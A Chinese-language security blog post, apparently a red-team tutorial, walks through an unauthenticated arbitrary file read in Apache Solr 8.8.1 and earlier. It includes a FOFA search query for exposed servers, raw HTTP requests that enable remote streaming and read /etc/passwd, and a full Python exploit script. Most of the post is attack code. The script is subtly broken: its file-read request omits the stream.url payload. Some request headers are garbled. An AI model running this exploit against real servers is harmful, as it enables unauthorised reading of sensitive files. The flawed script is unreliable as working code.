#  Apache Solr 任意文件读取漏洞（poc编写 ）   
原创 LULU  红队蓝军   2024-08-30 18:03  
  
**本篇主要是针对poc的编写**  
## 漏洞介绍   
  
Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件  
  
主要原因：由于未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。  
  
影响版本：Apache Solr <= 8.8.1  
  
fofa语法：app="Apache-Solr" && country="CN" && status_code="200"  
## 漏洞复现   
  
Solr下载地址：自行下载对应满足版本http://archive.apache.org/dist/lucene/solr/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibuAJmdCfgkHPL1dvOja2VHgibRvj2iaWQxjJAYiaCVCibZqHSbRO4KSEw3Ww/640?wx_fmt=png&from=appmsg "")  
  
**第一步、获取core的信息**  
```
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibubFm3fQpCSyzibfzNIshD6mJiavbE0Pjo1DVGF60h6bXicO7ko0yc2pcNA/640?wx_fmt=png&from=appmsg "")  
  
**第二步、依据core_name构造config包**  
```
POST /solr/demo/config HTTP/1.1
Host: ip:8983
Content-Length: 82
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Origin: http:/ip:89833 
Content-Type: application/json 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36 
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Referer: http://ip:8983/solr/demo/config
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibuBbCbKibcguUJpCrxiaaaaQaJ01vtENvznmnLgJ2AUvQO9199cKqtanIA/640?wx_fmt=png&from=appmsg "")  
  
依据响应包判断是否存在漏洞，状态包以及响应内容**"This response format is experimental.  It is likely to change in the future.**" 表示存在漏洞  
  
**第三步：读取文件/etc/passwd**  
```
POST /solr/demo/./debug/dump?param=ContentStreams HTTP/1.1
Host: 192.168.111.130:8983
Content-Length: 31
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Origin: http:/192.168.111.130:89833 
Content-Type: application/x-www-form-urlencoden 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36 
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Referer: http://192.168.111.130:8983/solr/demo/config
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 
Connection: close

stream.url=file:///etc/passwd

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibuEvFUNXATTOMLCJ14qMrvHO5Ik4vn4z4TZuW9L1QXvSHUkhiaibVTaIjw/640?wx_fmt=png&from=appmsg "")  
## poc分析   
  
构建poc的基础操作  
```
1、利用开源的POC框架，也可以自己写框架（建议使用poc框架）
2、熟悉漏洞原理
3、搭建漏洞靶场环境
4、选择编程语言（常用python)
    常用python库：
       urllib2: 发送HTTP/HTTPS请求
       requests:更“高级”的urllib2库
       re：正则表达式
       random：生成随机数
       base64：base64编码
       hashlib:常用来计算md5值
       time：用来统计访问时间延迟  等等。。。

```  
  
这里使用python进行编写  
```
引入python模块

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibuqqSL9RHhI029lR4rQ1T5fZ8uWEVwXMVftpnf07tMWBOcAQKamiczb9Q/640?wx_fmt=png&from=appmsg "")  
  
**第一步：获取core的信息**  
```
#拼接url然后提取name值
def get_core_name(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
    reqs = requests.get(url=core_url,timeout=10)

    try:
        core_name = list(json.loads(reqs.text)["status"])[0]
        return core_name
    except:
        # print ("无法提取")
        sys.exit()

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibu9djmeDh6jY8ChqNwFVwziamQDIjcslTcqm1l0fmcC3s4vO1DfVm9trQ/640?wx_fmt=png&from=appmsg "")  
  
**第二步、依据core_name构造config包**  
```
#构造config包
def enable_remote_streaming(target_url,core_name):
    session = requests.session()
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {"Content-type": "application/json"}
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    reqs = session.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)

    if "responseHeader" in reqs.text and reqs.status_code == 200:
        print ("存在漏洞")
        return True
    else:
        print ("不存在漏洞")
        return False

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibuohXfBrmomxW9WwTf7TCGEG68XwF9MqaiagruzYnAmVOjLPCmGxPwPSw/640?wx_fmt=png&from=appmsg "")  
  
**第三步：读取文件/etc/passwd**  
```
#构造查看/etc/passwd的包
def read_etc_passwd(target_url,core_name):
    session = requests.session()
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    reqs = session.post(url=vuln_url,headers=headers)

    if reqs.status_code == 200:
        print ("读取成功")
        print (reqs.text)
    else:
        return False

```  
  
**第四步：执行并输出**  
```
def main(target_url):
    core_name = get_core_name(target_url)

    if core_name:
        if enable_remote_streaming(target_url,core_name):
            read_etc_passwd(target_url,core_name)

if __name__ == "__main__":
    TARGET_URL = "http://ip:8983"
    main(TARGET_URL)

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6c5OxTk0IlI6JcthdNaZibu7laeuicMy7qkOz6q5QAhMmiaKKleJjrE12m0AFqVmRaDes5rcsFGj4Eg/640?wx_fmt=png&from=appmsg "")  
## poc编写   
```
# -*- coding: utf-8 -*-  
import requests

import sys

import random

import re

import base64

import time

import json

# from requests.packages.urllib3.exceptions import InsecureRequestWarning

#拼接url然后提取name值
def get_core_name(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
    reqs = requests.get(url=core_url,timeout=10)

    try:
        core_name = list(json.loads(reqs.text)["status"])[0]
        return core_name
    except:
        # print ("无法提取")
        sys.exit()


#构造config包
def enable_remote_streaming(target_url,core_name):
    session = requests.session()
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
  "Content-type": "application/json "}
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    reqs = session.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)

    if "responseHeader" in reqs.text and reqs.status_code == 200:
        print ("存在漏洞")
        return True
    else:
        print ("不存在漏洞")
        return False

#构造查看/etc/passwd的包
def read_etc_passwd(target_url,core_name):
    session = requests.session()
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    reqs = session.post(url=vuln_url,headers=headers)

    if reqs.status_code == 200:
        print ("读取成功")
        print (reqs.text)
    else:
        return False

def main(target_url):
    core_name = get_core_name(target_url)

    if core_name:
        if enable_remote_streaming(target_url,core_name):
            read_etc_passwd(target_url,core_name)

if __name__ == "__main__":
    TARGET_URL = "http://ip:8983"
    main(TARGET_URL)


```  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
